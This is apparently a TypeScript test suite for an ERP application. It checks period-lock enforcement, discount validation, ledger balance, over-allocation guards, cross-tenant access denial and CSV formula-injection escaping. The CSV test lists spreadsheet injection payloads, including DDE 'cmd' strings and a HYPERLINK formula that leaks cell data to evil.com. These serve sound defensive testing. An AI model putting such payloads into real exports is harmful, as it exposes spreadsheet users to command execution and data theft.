import test from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";

Object.assign(process.env, {
  ERP_DATA_DIR: mkdtempSync(path.join(tmpdir(), "modern-erp-chaos-security-")),
  BETTER_AUTH_SECRET: "chaos-security-edge-cases-test-key",
  NODE_ENV: "test",
});

const { getBusinessDb } = await import("../src/core/db/business");
const { seedDemoData } = await import("../src/core/db/seed");
const { createBusiness } = await import("../src/core/businesses/business-service");
const { invoiceInputSchema } = await import("../src/modules/sales-invoices/invoice-input");
const { createInvoice, updateInvoice, voidInvoice, getInvoice } = await import("../src/modules/sales-invoices/invoice-service");
const { savePurchaseInvoice, voidPurchaseInvoice } = await import("../src/modules/purchase-invoices/purchase-invoice-service");
const { createReceipt } = await import("../src/modules/receipts/receipt-service");
const { createSupplierPayment } = await import("../src/modules/supplier-payments/supplier-payment-service");
const { saveCreditNote, voidCreditNote } = await import("../src/modules/sales-credit-notes/credit-note-service");
const { saveDebitNote, voidDebitNote } = await import("../src/modules/debit-notes/debit-note-service");
const { saveOpeningBalances } = await import("../src/modules/accounting/services/opening-balances-service");
const { setFinancialLockDate } = await import("../src/modules/accounting/services/financial-lock-service");
const { postTransaction } = await import("../src/modules/accounting/services/posting-service");

test("Cybersecurity Audit & Chaos Edge-Case Verification Suite", async (suite) => {
  const seed = await seedDemoData();
  const userId = seed.admin.id;
  const businessId = seed.business.id;
  const { sqlite } = getBusinessDb(businessId, userId);

  const customer = sqlite.prepare("SELECT id FROM customers LIMIT 1").get() as { id: string };
  const supplier = sqlite.prepare("SELECT id FROM suppliers LIMIT 1").get() as { id: string };
  const salesAccount = sqlite.prepare("SELECT id FROM accounts WHERE type = 'income' AND is_active = 1 LIMIT 1").get() as { id: string };
  const expenseAccount = sqlite.prepare("SELECT id FROM accounts WHERE type = 'expense' AND is_active = 1 LIMIT 1").get() as { id: string };
  const bankAccount = sqlite.prepare("SELECT id FROM bank_accounts WHERE is_active = 1 LIMIT 1").get() as { id: string };
  const taxCode = sqlite.prepare("SELECT id FROM tax_codes WHERE rate_basis_points = 500 LIMIT 1").get() as { id: string };

  await suite.test("1. Financial Period Lock Integrity: Tampering with Closed Fiscal Year is Blocked", async () => {
    // Lock the financial period through 2025-12-31
    setFinancialLockDate(businessId, userId, "2025-12-31");

    // A. Attempt to create and post an invoice in the locked period (2025-11-15)
    assert.throws(
      () => {
        createInvoice(
          businessId,
          userId,
          {
            customerId: customer.id,
            currencyCode: "AED",
            invoiceDate: "2025-11-15",
            dueDate: "2025-12-15",
            lines: [
              {
                description: "Historical Audit Fee",
                quantity: "1",
                unitPrice: "1000",
                discountType: "none",
                discountValue: "0",
                salesAccountId: salesAccount.id,
                taxCodeId: taxCode.id,
              },
            ],
          },
          "post",
        );
      },
      (err: Error) => err.message.includes("closed"),
      "Must forbid posting a sales invoice dated in a closed financial period.",
    );

    // B. Attempt to save opening balances in a locked period
    assert.throws(
      () => {
        saveOpeningBalances(businessId, userId, "2025-10-01", [
          { accountId: salesAccount.id, debitMinor: 50000, creditMinor: 0 },
        ]);
      },
      (err: Error) => err.message.includes("closed"),
      "Must forbid setting opening balances dated in a closed financial period.",
    );

    // C. Attempt to create and post a purchase invoice (bill) in the locked period
    assert.throws(
      () => {
        savePurchaseInvoice(
          businessId,
          userId,
          {
            supplierId: supplier.id,
            supplierInvoiceNumber: "INV-HISTORICAL-01",
            currencyCode: "AED",
            invoiceDate: "2025-11-20",
            dueDate: "2025-12-20",
            lines: [
              {
                description: "Closed Period Expense",
                quantity: "2",
                unitPrice: "500",
                discountType: "none",
                discountValue: "0",
                expenseAccountId: expenseAccount.id,
                taxCodeId: taxCode.id,
              },
            ],
          },
          "post",
        );
      },
      (err: Error) => err.message.includes("closed"),
      "Must forbid posting a purchase bill in a closed financial period.",
    );

    // D. Attempt to create a customer receipt in the locked period
    assert.throws(
      () => {
        createReceipt(businessId, userId, {
          customerId: customer.id,
          date: "2025-11-30",
          bankAccountId: bankAccount.id,
          amount: "1000",
          currencyCode: "AED",
        });
      },
      (err: Error) => err.message.includes("closed"),
      "Must forbid recording customer receipts in a closed financial period.",
    );

    // E. Attempt to create a supplier payment in the locked period
    assert.throws(
      () => {
        createSupplierPayment(businessId, userId, {
          supplierId: supplier.id,
          date: "2025-12-05",
          bankAccountId: bankAccount.id,
          amount: "500",
          currencyCode: "AED",
        });
      },
      (err: Error) => err.message.includes("closed"),
      "Must forbid recording supplier payments in a closed financial period.",
    );

    // F. Attempt to retroactively modify a historical invoice that was posted before lock date
    // Temporarily unlock to seed a document in 2025
    setFinancialLockDate(businessId, userId, null);
    const historicalInvId = createInvoice(
      businessId,
      userId,
      {
        customerId: customer.id,
        currencyCode: "AED",
        invoiceDate: "2025-06-15",
        dueDate: "2025-07-15",
        lines: [
          {
            description: "Legacy Consulting",
            quantity: "1",
            unitPrice: "2000",
            discountType: "none",
            discountValue: "0",
            salesAccountId: salesAccount.id,
            taxCodeId: taxCode.id,
          },
        ],
      },
      "post",
    );

    // Now re-lock the fiscal year
    setFinancialLockDate(businessId, userId, "2025-12-31");

    // Attack 1: Attempt to edit the historical invoice, moving it to 2026
    assert.throws(
      () => {
        updateInvoice(
          businessId,
          userId,
          historicalInvId,
          {
            customerId: customer.id,
            currencyCode: "AED",
            invoiceDate: "2026-03-01",
            dueDate: "2026-03-31",
            lines: [
              {
                description: "Tampered Consulting",
                quantity: "1",
                unitPrice: "9999",
                discountType: "none",
                discountValue: "0",
                salesAccountId: salesAccount.id,
                taxCodeId: taxCode.id,
              },
            ],
          },
          "post",
        );
      },
      (err: Error) => err.message.includes("closed"),
      "Must forbid modifying or retiming a document whose original date is in a closed period.",
    );

    // Attack 2: Attempt to void the historical invoice
    assert.throws(
      () => {
        voidInvoice(businessId, userId, historicalInvId);
      },
      (err: Error) => err.message.includes("closed"),
      "Must forbid voiding an invoice that belongs to a closed financial period.",
    );

    // Unlock to restore standard operations
    setFinancialLockDate(businessId, userId, null);
  });

  await suite.test("2. Input Validation Hardening: Malformed and Negative Discount Attack Vectors", () => {
    const basePayload = {
      customerId: customer.id,
      invoiceDate: "2026-05-01",
      dueDate: "2026-05-31",
      currencyCode: "AED",
      lines: [
        {
          description: "Test Product",
          quantity: "1",
          unitPrice: "100",
          discountType: "percentage" as const,
          salesAccountId: salesAccount.id,
          taxCodeId: taxCode.id,
        },
      ],
    };

    // Attack: Negative discount value
    assert.throws(
      () => {
        invoiceInputSchema.parse({
          ...basePayload,
          lines: [{ ...basePayload.lines[0], discountValue: "-25" }],
        });
      },
      /Discount must be a positive number/,
      "Must reject negative discount value.",
    );

    // Attack: Non-numeric payload
    assert.throws(
      () => {
        invoiceInputSchema.parse({
          ...basePayload,
          lines: [{ ...basePayload.lines[0], discountValue: "EXPLOIT" }],
        });
      },
      /Discount must be a positive number/,
      "Must reject alphabetic string in discount field.",
    );

    // Attack: Excessive decimal places in discount
    assert.throws(
      () => {
        invoiceInputSchema.parse({
          ...basePayload,
          lines: [{ ...basePayload.lines[0], discountValue: "12.34567" }],
        });
      },
      /Discount must be a positive number/,
      "Must reject discount with more than 4 decimal places.",
    );

    // Valid discount: "15"
    const validParsed = invoiceInputSchema.parse({
      ...basePayload,
      lines: [{ ...basePayload.lines[0], discountValue: "15" }],
    });
    assert.equal(validParsed.lines[0].discountValue, "15");

    // Empty discount converts safely to "0"
    const emptyParsed = invoiceInputSchema.parse({
      ...basePayload,
      lines: [{ ...basePayload.lines[0], discountValue: "" }],
    });
    assert.equal(emptyParsed.lines[0].discountValue, "0");
  });

  await suite.test("3. Accounting Invariants: Double-Entry Balance and Over-Allocation Protection", () => {
    // Double-entry ledger guard: Attempt to post unbalanced journal
    assert.throws(
      () => {
        postTransaction(sqlite, {
          sourceType: "manual_journal",
          sourceId: "fake-id",
          date: "2026-05-10",
          description: "Unbalanced attack",
          lines: [
            { accountId: salesAccount.id, debitMinor: 10000, creditMinor: 0, description: "Debit" },
            { accountId: expenseAccount.id, debitMinor: 0, creditMinor: 8000, description: "Credit" },
          ],
        });
      },
      (err: Error) => err.message.includes("not balanced"),
      "Must reject unbalanced journal entries.",
    );

    // Create a real posted invoice for 525.00 AED (500 + 5% tax)
    const invId = createInvoice(
      businessId,
      userId,
      {
        customerId: customer.id,
        currencyCode: "AED",
        invoiceDate: "2026-05-15",
        dueDate: "2026-06-15",
        lines: [
          {
            description: "Consulting",
            quantity: "1",
            unitPrice: "500",
            discountType: "none",
            discountValue: "0",
            salesAccountId: salesAccount.id,
            taxCodeId: taxCode.id,
          },
        ],
      },
      "post",
    );

    const inv = getInvoice(businessId, userId, invId)!;
    assert.equal(inv.invoice.totalMinor, 52500);

    // Over-allocation attack: Attempt to allocate 1,000.00 AED on a 525.00 AED invoice
    assert.throws(
      () => {
        createReceipt(businessId, userId, {
          customerId: customer.id,
          date: "2026-05-20",
          bankAccountId: bankAccount.id,
          amount: "1000",
          currencyCode: "AED",
          allocations: [{ invoiceId: invId, amount: "1000" }],
        });
      },
      (err: Error) => err.message.includes("exceed"),
      "Must reject over-allocation beyond the invoice balance.",
    );

    // Credit Note over-allocation attack: Attempt to issue a credit note for 600.00 AED against 525.00 AED invoice
    assert.throws(
      () => {
        saveCreditNote(
          businessId,
          userId,
          {
            customerId: customer.id,
            sourceInvoiceId: invId,
            currencyCode: "AED",
            date: "2026-05-22",
            lines: [
              {
                description: "Over credit",
                quantity: "1",
                unitPrice: "600",
                discountType: "none",
                discountValue: "0",
                salesAccountId: salesAccount.id,
                taxCodeId: taxCode.id,
              },
            ],
          },
          "post",
        );
      },
      (err: Error) => err.message.includes("exceed"),
      "Must reject credit note exceeding invoice remaining balance.",
    );
  });

  await suite.test("4. Multi-Tenant IDOR Guard: Cross-Business Access Blocked", async () => {
    // Create an isolated second business
    const alien = createBusiness(
      { name: "Alien Business Inc", country: "United Arab Emirates", currency: "AED", financialYearStartMonth: 1 },
      userId,
    );

    // Attempt to access Alien Business with a forged/non-member user ID
    assert.throws(
      () => {
        getBusinessDb(alien.id, "00000000-0000-0000-0000-000000000000");
      },
      (err: Error) => err.message.includes("BUSINESS_ACCESS_DENIED"),
      "Must strictly block access to businesses the user is not a member of.",
    );
  });

  await suite.test("5. CSV Formula Injection Defense (CWE-1236 / OWASP Prevention)", async () => {
    const { escapeCsvCell, formatCsv } = await import("@/lib/csv-utils");

    // Attack payloads that attempt to execute commands or DDE in Excel
    const maliciousInputs = [
      "=cmd|'/C calc'!A0",
      "+cmd|'/C notepad'!A0",
      "-2+3+cmd|'/C calc'!A0",
      "@SUM(A1:A10)",
      "\tmalicious_tab",
      "\rmalicious_cr",
      "=HYPERLINK(\"http://evil.com/leak?leak=\"&A1, \"Click Here\")",
    ];

    for (const input of maliciousInputs) {
      const escaped = escapeCsvCell(input);
      assert.ok(
        escaped.startsWith("'") || escaped.startsWith("\"'"),
        `Malicious input "${input}" must be sanitized by prepending a single quote. Got: ${escaped}`
      );
    }

    // Standard safe inputs should not be altered with prepended single quotes
    assert.strictEqual(escapeCsvCell("Invoice #1001"), "Invoice #1001");
    assert.strictEqual(escapeCsvCell("1250.50"), "1250.50");

    // Formatted CSV rows with mixed malicious and safe values
    const tableData = [
      ["Invoice Number", "Customer Name", "Amount"],
      ["INV-001", "=cmd|'/C calc'!A0", 500],
      ["INV-002", "ACME Corp, LLC", 1200.5],
      ["INV-003", "=HYPERLINK(\"http://evil.com\", \"Click\")", 100],
    ];

    const formatted = formatCsv(tableData);
    assert.ok(formatted.includes("'=cmd|'/C calc'!A0"), "Must prefix unquoted formula injection payload with single quote");
    assert.ok(formatted.includes("\"ACME Corp, LLC\""), "Must safely quote cells containing commas");
    assert.ok(formatted.includes("\"'=HYPERLINK(\"\"http://evil.com\"\", \"\"Click\"\")\""), "Must safely quote and escape internal quotes for formula injection payload");
  });
});

